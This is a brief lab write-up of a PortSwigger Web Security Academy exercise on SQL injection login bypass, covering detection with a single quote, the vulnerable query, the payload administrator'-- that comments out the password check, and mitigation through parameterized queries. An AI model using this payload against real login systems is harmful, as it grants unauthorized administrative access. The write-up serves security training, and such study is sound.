# SQL Injection — Login Bypass
## Lab: PortSwigger Web Security Academy
## Difficulty: Apprentice (Easy)

## 1. Reconnaissance (Keşif)
- Target: /login endpoint
- Found: username + password form
- Test: Single quote (') in password → 500 error
- Conclusion: SQL injection vulnerability confirmed

## 2. Understanding the Query
Vulnerable query:
SELECT * FROM users WHERE username='[input]' AND password='[input]'

## 3. Exploitation
Payload: username = administrator'--
Result query:
SELECT * FROM users WHERE username='administrator'--' AND password='x'
→ Password check bypassed. Response: 302 Found ✅

## 4. Impact
- Full authentication bypass
- Attacker gains admin access without credentials

## 5. Mitigation
- Use prepared statements / parameterized queries
- Never concatenate user input into SQL
- python: cursor.execute("...WHERE username=?", (username,))